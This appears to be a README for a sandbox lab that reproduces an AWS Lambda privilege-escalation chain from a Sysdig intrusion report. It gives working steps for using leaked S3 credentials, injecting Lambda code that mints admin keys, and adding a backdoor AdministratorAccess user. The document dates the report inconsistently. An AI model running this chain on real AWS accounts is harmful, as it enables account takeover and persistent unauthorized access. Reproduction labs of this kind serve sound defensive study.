# Sysdig AWS Lambda Privesc: Reproduction Lab

A minimal Terraform setup that reproduces the privilege-escalation primitive from Sysdig's November 2025 cloud intrusion report. Deploys a deliberately vulnerable AWS account with a public S3 bucket containing IAM credentials, an over-permissioned Lambda execution role, and an exploitable user-to-Lambda permission path.

> **Sandbox accounts only.** This provisions live AWS credentials in a publicly readable bucket. Never deploy in a production or shared account.

## Prerequisites

- AWS sandbox account with an admin IAM user
- AWS CLI v2 (`aws configure` with admin credentials, region `us-east-1`)
- Terraform ≥ 1.5
- `jq` (for parsing the attack response)

## Setup

```bash
git clone <repo-url>
cd sysdig-sim
terraform init
terraform apply       # type 'yes'
```

Provisioning takes about a minute. The outputs include the bucket name and the public credentials URL.

Confirm the initial-access vector works:

```bash
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_PROFILE
curl -s $(terraform output -raw public_creds_url)
```

You should see a valid AWS access-key pair printed in plaintext.

## Running the Attack

**1. Configure the attacker profile** with the stolen credentials:

```bash
aws configure --profile attacker      # paste the stolen keys
aws --profile attacker sts get-caller-identity
# Should return: ...user/compromised_user
```

**2. Build the malicious payload:**

```bash
mkdir -p payload
cat > payload/index.py <<'EOF'
import boto3, json

def lambda_handler(event, context):
    iam = boto3.client('iam')
    try:
        key = iam.create_access_key(UserName='frick')
        return {
            'statusCode': 200,
            'body': json.dumps({
                'AccessKeyId': key['AccessKey']['AccessKeyId'],
                'SecretAccessKey': key['AccessKey']['SecretAccessKey'],
            })
        }
    except Exception as e:
        return {'statusCode': 500, 'body': str(e)}
EOF

cd payload && zip -r ../payload.zip index.py && cd ..
```

**3. Inject and invoke:**

```bash
export AWS_PAGER=""

aws --profile attacker lambda update-function-code \
  --function-name EC2-init \
  --zip-file fileb://payload.zip

# Wait ~10 seconds for the update to finalize
aws --profile attacker lambda invoke \
  --function-name EC2-init \
  --cli-binary-format raw-in-base64-out \
  /tmp/lambda-output.json

cat /tmp/lambda-output.json | jq -r '.body | fromjson'
```

The response contains a freshly-minted access-key pair for the admin user `frick`.

**4. Establish persistence** by creating a backdoor admin user with `frick`'s new keys:

```bash
aws configure --profile pwned          # paste frick's keys
aws --profile pwned iam create-user --user-name backdoor-admin
aws --profile pwned iam attach-user-policy \
  --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws --profile pwned iam create-access-key --user-name backdoor-admin
```

End state: three compromised identities (`compromised_user`, `frick`, `backdoor-admin`), one of which exists entirely outside Terraform state.

## Cleanup

```bash
# Delete the backdoor user (Terraform doesn't track it)
aws iam list-access-keys --user-name backdoor-admin \
  --query 'AccessKeyMetadata[].AccessKeyId' --output text | \
  xargs -n 1 aws iam delete-access-key --user-name backdoor-admin --access-key-id
aws iam detach-user-policy --user-name backdoor-admin \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam delete-user --user-name backdoor-admin

# Delete the attacker-minted keys on frick
aws iam list-access-keys --user-name frick \
  --query 'AccessKeyMetadata[].AccessKeyId' --output text | \
  xargs -n 1 aws iam delete-access-key --user-name frick --access-key-id

# Tear down everything else
terraform destroy
```

## Repository Structure

```
sysdig-sim/
├── README.md
├── providers.tf       # Terraform + AWS provider config
├── users.tf           # IAM users: compromised_user, frick
├── lambda.tf          # Lambda + over-permissioned execution role
├── s3.tf              # Public S3 bucket exposing credentials
└── outputs.tf         # Bucket name + public URL
```

## Reference

Sysdig Threat Research Team, *AI-assisted cloud intrusion achieves admin access in 8 minutes* (Feb 2026): <https://www.sysdig.com/blog/ai-assisted-cloud-intrusion-achieves-admin-access-in-8-minutes>